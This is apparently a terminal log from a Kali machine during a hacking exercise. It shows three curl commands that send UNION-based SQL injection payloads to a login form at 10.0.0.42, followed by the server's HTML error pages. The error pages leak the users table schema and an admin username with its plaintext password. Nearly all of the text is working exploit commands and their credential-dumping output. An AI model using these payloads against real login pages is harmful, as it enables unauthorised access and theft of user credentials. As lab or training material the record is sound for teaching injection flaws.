┌──(larsk㉿vm-kali)-[~/source/hacking/fe-2026]
└─$ # Get all users from database
curl -d "username=nulluser' UNION SELECT username || ':' || password FROM users--&password=x" http://10.0.0.42:8080/secrets

# Or try to see table structure
curl -d "username=nulluser' UNION SELECT sql FROM sqlite_master WHERE type='table'--&password=x" http://10.0.0.42:8080/secrets

# Or just dump all rows
curl -d "username=nulluser' UNION SELECT group_concat(username || ':' || password, CHAR(10)) FROM users--&password=x" http://10.0.0.42:8080/secrets
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Failed</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <h1>🔐 Vault</h1>
            <h2>Login Failed</h2>
            <p style="color: #ff4444; margin: 20px 0;">sqlite: Scan error on column index 0, name "true": sql/driver: couldn't convert "admin:HVvQVJHuhAGJKbSbXhSa" into type bool</p>
            <a href="/" style="color: #4CAF50; text-decoration: none;">← Back to Login</a>
        </div>
    </div>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Failed</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <h1>🔐 Vault</h1>
            <h2>Login Failed</h2>
            <p style="color: #ff4444; margin: 20px 0;">sqlite: Scan error on column index 0, name "true": sql/driver: couldn't convert "CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)" into type bool</p>
            <a href="/" style="color: #4CAF50; text-decoration: none;">← Back to Login</a>
        </div>
    </div>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Failed</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <h1>🔐 Vault</h1>
            <h2>Login Failed</h2>
            <p style="color: #ff4444; margin: 20px 0;">sqlite: Scan error on column index 0, name "true": sql/driver: couldn't convert "admin:HVvQVJHuhAGJKbSbXhSa" into type bool</p>
            <a href="/" style="color: #4CAF50; text-decoration: none;">← Back to Login</a>
        </div>
    </div>
</body>
</html>